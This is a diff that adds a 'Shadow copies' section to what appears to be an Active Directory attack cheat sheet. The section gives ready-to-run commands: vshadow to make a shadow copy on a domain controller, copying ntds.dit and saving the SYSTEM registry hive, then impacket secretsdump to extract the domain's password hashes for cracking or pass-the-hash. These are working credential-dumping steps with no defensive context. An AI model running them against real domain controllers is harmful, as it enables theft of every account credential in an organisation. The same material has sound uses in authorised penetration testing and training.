@@ -166,4 +166,13 @@ Reference: https://www.blackhat.com/docs/us-14/materials/us-14-Duckwall-Abusing-
 
 ### Shawdow copies
 
+Connect as a Domain Admin on the Domain Controller.
+Impacke-SecretDump on GitHub: https://github.com/fortra/impacket/blob/master/examples/secretsdump.py
+```
+c:\path\to\vshadow > .\vshadow.exe -nw -p c: # take note of the "Shadow copy device name"
+> copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopyX\windows\ntds\ntds.dit c:\ntds.dit.bak
+> reg.exe save hklm\system c:\system.bak
 
+kali $ impacket-secretdump -ntds ntds.dit.bak -system system.bak LOCAL
+```
+Hashes can be cracked or used for PtH attacks.
